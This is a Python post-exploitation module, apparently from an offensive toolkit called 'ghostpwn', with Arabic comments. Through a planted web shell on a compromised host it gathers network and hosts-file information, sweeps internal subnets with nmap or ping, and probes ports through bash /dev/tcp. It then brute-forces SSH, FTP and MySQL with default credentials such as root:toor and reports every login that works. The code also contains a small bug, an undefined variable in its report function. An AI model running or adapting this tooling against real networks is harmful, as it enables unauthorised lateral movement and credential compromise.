#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ghostpwn - Lateral Movement
الانتقال في الشبكة الداخلية بعد الاختراق
"""
import sys
import os
import re
import socket
import time
import json
from typing import Dict, List, Optional
from concurrent.futures import ThreadPoolExecutor, as_completed

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from modules.http_client import HttpClient
from modules.arabic_display import SmartLogger, Colors, fix_display
from modules.post_exploit import PostExploit


class LateralMovement:
    """الانتقال في الشبكة الداخلية"""

    def __init__(self, http_client: HttpClient = None, audit_logger=None,
                 shell_url: str = None, shell_password: str = "ghost"):
        self.client = http_client or HttpClient(timeout=15)
        self.audit = audit_logger
        self.logger = SmartLogger()

        self.post_exploit = PostExploit(self.client, audit_logger)
        if shell_url:
            self.post_exploit.set_shell(shell_url, shell_password)

        self.discovered_hosts = []
        self.accessible_services = []

    def _log(self, msg, level="info"):
        getattr(self.logger, level, self.logger.info)(msg)
        if self.audit:
            self.audit.log_event(f"[LATERAL] {msg}", level)

    def execute(self) -> Dict:
        """تنفيذ الـ lateral movement"""
        self._log("بدء الـ lateral movement...", "phase")

        result = {
            "internal_recon": {},
            "discovered_hosts": [],
            "accessible_services": [],
            "movements_attempted": [],
            "movements_success": [],
        }

        # 1) Recon على الشبكة الداخلية
        result["internal_recon"] = self._internal_recon()

        # 2) اكتشاف hosts في نفس الـ subnet
        result["discovered_hosts"] = self._discover_internal_hosts()

        # 3) فحص services على الـ hosts المكتشفة
        result["accessible_services"] = self._scan_internal_services()

        # 4) محاولة الوصول لـ services مشتركة
        result["movements_attempted"] = self._attempt_lateral_access()

        self._print_lateral_report(result)
        return result

    def _internal_recon(self) -> Dict:
        """استطلاع الشبكة الداخلية"""
        self._log("استطلاع الشبكة الداخلية...", "info")

        recon = {}

        # معلومات الشبكة
        commands = {
            "interfaces": "ip addr show 2>/dev/null || ifconfig -a",
            "routes": "ip route 2>/dev/null || route -n",
            "arp_table": "arp -a 2>/dev/null || ip neigh",
            "dns_servers": "cat /etc/resolv.conf 2>/dev/null",
            "hosts_file": "cat /etc/hosts 2>/dev/null",
            "listening_ports": "netstat -tlnp 2>/dev/null || ss -tlnp 2>/dev/null",
            "active_connections": "netstat -antp 2>/dev/null || ss -antp 2>/dev/null",
        }

        for name, cmd in commands.items():
            output = self.post_exploit.execute(cmd)
            if output and len(output.strip()) > 0:
                recon[name] = output[:2000]
                self._log(f"  {name}: collected", "info")

        return recon

    def _discover_internal_hosts(self) -> List[Dict]:
        """اكتشاف hosts في الشبكة الداخلية"""
        self._log("اكتشاف hosts داخلية...", "info")

        # استخراج subnet من الـ interfaces
        interfaces_output = self.post_exploit.execute("ip addr show 2>/dev/null || ifconfig")

        # استخراج IPs
        import re
        ip_pattern = r'\b(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/\d{1,2}\b'
        matches = re.findall(ip_pattern, interfaces_output)

        subnets = set()
        for ip in matches:
            # تجاهل loopback
            if ip.startswith("127."):
                continue
            parts = ip.split(".")
            subnet = f"{parts[0]}.{parts[1]}.{parts[2]}.0/24"
            subnets.add(subnet)

        self._log(f"Subnets المكتشفة: {subnets}", "info")

        # فحص ping sweep لكل subnet
        hosts = []
        for subnet in list(subnets)[:2]:  # أول 2 subnets
            self._log(f"Ping sweep على {subnet}...", "info")

            # استخدام nmap لو متاح
            nmap_cmd = f"nmap -sn {subnet} 2>/dev/null | grep 'Nmap scan report'"
            output = self.post_exploit.execute(nmap_cmd)

            if output and "Nmap scan report" in output:
                # استخراج IPs
                alive_ips = re.findall(r'Nmap scan report for ([\d.]+)', output)
                for ip in alive_ips:
                    hosts.append({"ip": ip, "subnet": subnet})
                    self._log(f"  Host alive: {ip}", "success")
            else:
                # استخدام ping العادي
                parts = subnet.split(".")
                base = f"{parts[0]}.{parts[1]}.{parts[2]}"

                for i in range(1, 255):
                    ip = f"{base}.{i}"
                    cmd = f"ping -c 1 -W 1 {ip} 2>/dev/null | grep 'from'"
                    result = self.post_exploit.execute(cmd)

                    if result and "from" in result:
                        hosts.append({"ip": ip, "subnet": subnet})
                        self._log(f"  Host alive: {ip}", "success")

        self.discovered_hosts = hosts
        return hosts

    def _scan_internal_services(self) -> List[Dict]:
        """فحص services على الـ hosts المكتشفة"""
        self._log("فحص services داخلية...", "info")

        services = []

        # بورتات شائعة
        common_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445,
                       993, 995, 1723, 3306, 3389, 5432, 5900, 8080, 8443]

        for host_info in self.discovered_hosts[:10]:  # أول 10 hosts
            ip = host_info["ip"]
            self._log(f"فحص ports على {ip}...", "info")

            for port in common_ports:
                cmd = f"timeout 2 bash -c 'echo > /dev/tcp/{ip}/{port}' 2>/dev/null && echo 'OPEN' || echo 'CLOSED'"
                result = self.post_exploit.execute(cmd)

                if "OPEN" in result:
                    service_info = {
                        "ip": ip,
                        "port": port,
                        "service": self._identify_service(port),
                    }
                    services.append(service_info)
                    self._log(f"  {ip}:{port} OPEN ({service_info['service']})", "success")

        self.accessible_services = services
        return services

    def _identify_service(self, port: int) -> str:
        """تحديد الخدمة من البورت"""
        services = {
            21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",
            80: "HTTP", 110: "POP3", 143: "IMAP", 443: "HTTPS", 445: "SMB",
            993: "IMAPS", 995: "POP3S", 1723: "PPTP", 3306: "MySQL",
            3389: "RDP", 5432: "PostgreSQL", 5900: "VNC", 8080: "HTTP-Alt",
            8443: "HTTPS-Alt",
        }
        return services.get(port, "Unknown")

    def _attempt_lateral_access(self) -> List[Dict]:
        """محاولة الوصول للـ services المكتشفة"""
        self._log("محاولة الوصول للـ services...", "info")

        attempts = []

        for service in self.accessible_services:
            ip = service["ip"]
            port = service["port"]
            service_name = service["service"]

            # محاولة default credentials
            if service_name == "SSH":
                cred_attempts = self._try_ssh_access(ip)
                attempts.extend(cred_attempts)

            elif service_name == "FTP":
                cred_attempts = self._try_ftp_access(ip)
                attempts.extend(cred_attempts)

            elif service_name in ["MySQL", "PostgreSQL"]:
                cred_attempts = self._try_db_access(ip, port, service_name)
                attempts.extend(cred_attempts)

            elif service_name in ["HTTP", "HTTP-Alt"]:
                web_attempts = self._try_web_access(ip, port)
                attempts.extend(web_attempts)

        return attempts

    def _try_ssh_access(self, ip: str) -> List[Dict]:
        """محاولة SSH access بـ default credentials"""
        self._log(f"محاولة SSH على {ip}...", "info")

        attempts = []
        default_creds = [
            ("root", "root"), ("root", "password"), ("root", "toor"),
            ("admin", "admin"), ("admin", "password"),
            ("user", "user"), ("user", "password"),
        ]

        for username, password in default_creds:
            cmd = f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 {username}@{ip} 'id' 2>/dev/null"
            result = self.post_exploit.execute(cmd)

            if result and "uid=" in result:
                attempts.append({
                    "ip": ip,
                    "service": "SSH",
                    "username": username,
                    "password": password,
                    "success": True,
                    "output": result[:200],
                })
                self._log(f"  SSH access ناجح! {username}:{password}", "success")
                return attempts

            attempts.append({
                "ip": ip,
                "service": "SSH",
                "username": username,
                "password": password,
                "success": False,
            })

        return attempts

    def _try_ftp_access(self, ip: str) -> List[Dict]:
        """محاولة FTP access"""
        self._log(f"محاولة FTP على {ip}...", "info")

        attempts = []
        default_creds = [
            ("anonymous", ""), ("admin", "admin"), ("ftp", "ftp"),
        ]

        for username, password in default_creds:
            cmd = f"curl -s --connect-timeout 5 -u '{username}:{password}' ftp://{ip}/ 2>/dev/null"
            result = self.post_exploit.execute(cmd)

            if result and len(result) > 50:
                attempts.append({
                    "ip": ip,
                    "service": "FTP",
                    "username": username,
                    "password": password,
                    "success": True,
                })
                self._log(f"  FTP access ناجح! {username}:{password}", "success")
                return attempts

        return attempts

    def _try_db_access(self, ip: str, port: int, service: str) -> List[Dict]:
        """محاولة DB access"""
        self._log(f"محاولة {service} على {ip}:{port}...", "info")

        attempts = []

        if service == "MySQL":
            default_creds = [("root", ""), ("root", "password"), ("root", "root")]
            for username, password in default_creds:
                cmd = f"mysql -h {ip} -P {port} -u {username}"
                if password:
                    cmd += f" -p'{password}'"
                cmd += " -e 'SELECT 1' 2>/dev/null"
                result = self.post_exploit.execute(cmd)

                if result and "1" in result:
                    attempts.append({
                        "ip": ip,
                        "service": service,
                        "username": username,
                        "password": password,
                        "success": True,
                    })
                    self._log(f"  {service} access ناجح!", "success")
                    return attempts

        return attempts

    def _try_web_access(self, ip: str, port: int) -> List[Dict]:
        """محاولة Web access"""
        self._log(f"محاولة Web على {ip}:{port}...", "info")

        attempts = []

        # فحص لو فيه admin panels
        admin_paths = ["/admin", "/login", "/wp-admin", "/administrator"]

        for path in admin_paths:
            url = f"http://{ip}:{port}{path}"
            cmd = f"curl -s -o /dev/null -w '%{{http_code}}' {url} 2>/dev/null"
            result = self.post_exploit.execute(cmd)

            if result and result.strip() in ["200", "301", "302", "401"]:
                attempts.append({
                    "ip": ip,
                    "port": port,
                    "service": "Web",
                    "path": path,
                    "status": result.strip(),
                    "success": True,
                })
                self._log(f"  Web path: {path} ({result.strip()})", "success")

        return attempts

    def _print_lateral_report(self, result: Dict):
        """عرض تقرير الـ lateral movement"""
        print(f"\n{Colors.MAGENTA}{'='*60}{Colors.NC}")
        print(f"{Colors.MAGENTA}  🌐 تقرير Lateral Movement{Colors.NC}")
        print(f"{Colors.MAGENTA}{'='*60}{Colors.NC}")

        recon = result["internal_recon"]
        print(f"\n  {Colors.BOLD}📡 معلومات الشبكة:{Colors.NC}")
        for key in ["interfaces", "routes", "arp_table"]:
            if key in recon:
                print(f"    {Colors.GREEN}✓{Colors.NC} {key}")

        hosts = result["discovered_hosts"]
        print(f"\n  {Colors.BOLD}🖥  Hosts المكتشفة: {len(hosts)}{Colors.NC}")
        for host in hosts[:10]:
            print(f"    {Colors.GREEN}✓{Colors.NC} {host['ip']}")

        services = result["accessible_services"]
        print(f"\n  {Colors.BOLD}🔌 Services مكشوفة: {len(services)}{Colors.NC}")
        for svc in services[:15]:
            print(f"    {Colors.YELLOW}{svc['ip']}:{svc['port']}{Colors.NC} ({svc['service']})")

        # محاولات ناجحة
        successful = [a for a in result["movements_attempted"] if a.get("success")]
        if successful:
            print(f"\n  {Colors.RED + Colors.BOLD}✅ وصول ناجح لـ {len(successing)} خدمة!{Colors.NC}")
            for attempt in successful:
                if "username" in attempt:
                    print(f"    {attempt['ip']} - {attempt['service']}: {attempt['username']}:{attempt['password']}")
                else:
                    print(f"    {attempt['ip']} - {attempt['service']}")

        print(f"\n{Colors.MAGENTA}{'='*60}{Colors.NC}")


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="ghostpwn - Lateral Movement")
    parser.add_argument("--shell-url", required=True)
    parser.add_argument("--password", default="ghost")
    args = parser.parse_args()

    client = HttpClient(timeout=15)
    lateral = LateralMovement(client, shell_url=args.shell_url, shell_password=args.password)
    result = lateral.execute()
